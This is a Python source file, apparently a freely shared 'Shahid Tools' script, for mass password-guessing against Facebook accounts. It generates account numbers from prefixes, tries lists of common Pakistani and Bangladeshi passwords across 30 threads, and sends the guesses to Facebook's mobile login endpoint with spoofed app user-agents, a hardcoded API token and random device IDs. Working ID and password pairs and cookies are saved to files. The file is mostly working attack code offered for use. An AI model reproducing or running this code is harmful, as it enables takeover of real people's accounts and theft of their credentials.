# Orignally Written By Shahid Khan
...
try:
	...
	os.system('python Shahid.py')
os.system("clear")
print('\n\033[1;32m Loading Shahid Tools...')
...
#os.system('xdg-open https://www.facebook.com/profile.php?id=100007150086235&mibextid=ZbWKwL')
os.system('xdg-open https://chat.whatsapp.com/KvFjiZjAa1PKuPiA8Z0D0i')
...
def ua_mafia():
	...
	END = "[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/Orca-Android;FBAV/266.0.0.16.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/216901621;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/){density=1.0,width=600,height=976};FB_FW/1;] FBBK/1;]"+END
	return ua

xxxx="[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/Orca-Android;FBAV/266.0.0.16.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/216901621;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/){density=1.0,width=600,height=976};FB_FW/1;] FBBK/1;]"

folder_path = '/sdcard/Shahid'
try:
...
loop=0
logo=("""\033[1;37m 
  \033[1;32m.d8888. db   db  .d8b.  db   db d888888b d8888b. 
  \033[1;33m88'  YP 88   88 d8' `8b 88   88   `88'   88  `8D 
  \033[1;33m`8bo.   88ooo88 88ooo88 88ooo88    88    88   88 
  \033[1;33m  `Y8b. 88~~~88 88~~~88 88~~~88    88    88   88 
  \033[1;33mdb   8D 88   88 88   88 88   88   .88.   88  .8D 
  \033[1;32m`8888Y' YP   YP YP   YP YP   YP Y888888P Y8888D'
----------------------------------------------
\033[1;32m 1\033[1;37m OWNER       \033[1;32m 👉\033[1;37m  ShAhiD KhAn 
\033[1;32m 2\033[1;37m FACEBOOK    \033[1;32m 👉\033[1;37m  SHAHID KHAN
\033[1;32m 3\033[1;37m TOOLS        \033[1;32m👉\033[1;37m  FReE
\033[1;32m 4\033[1;37m VERSION     \033[1;32m 👉\033[1;37m  \033[1;32m4.1\033[1;37m 
\033[1;32m 4\033[1;37m Watsapp     \033[1;32m 👉\033[1;37m  \033[1;33m0341-9778301\033[1;37m 
------------------------------------------------""")
...
def file_crack():
	...
	with tred(max_workers=30) as Shahid:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				Shahid.submit(api1,ids,names,passlist)
			else:
				Shahid.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def pak():
	...
	with tred(max_workers=30) as Shahid:
		...
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'khankhan','khan123','kingkhan','khan12345','khanbaba','khan1122']
			Shahid.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
	...
	with tred(max_workers=30) as Shahid:
		...
		for psx in user:
			ids = code+psx
			passlist = ['Mahadi','Jannati','Sumaiya','Nusrat','01700','708090','102030','777000','999000','888000','123456','bangladesh','bangla123','bangladesh123',ids,psx]
			Shahid.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[Shahid]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				xxx = "[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/Orca-Android;FBAV/266.0.0.16.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/216901621;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/){density=1.0,width=600,height=976};FB_FW/1;] FBBK/1;]"
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/Orca-Android;FBAV/266.0.0.16.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/216901621;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/){density=1.0,width=600,height=976};FB_FW/1;] FBBK/1;]"
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[Shahid-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'Shahid_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'Shahid_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [Shahid-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'Shahid-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[Shahid-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
			xxx = "[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/Orca-Android;FBAV/266.0.0.16.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/216901621;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/){density=1.0,width=600,height=976};FB_FW/1;] FBBK/1;]"
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/Orca-Android;FBAV/266.0.0.16.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/216901621;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/){density=1.0,width=600,height=976};FB_FW/1;] FBBK/1;]"
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [Shahid-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'Shahid_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
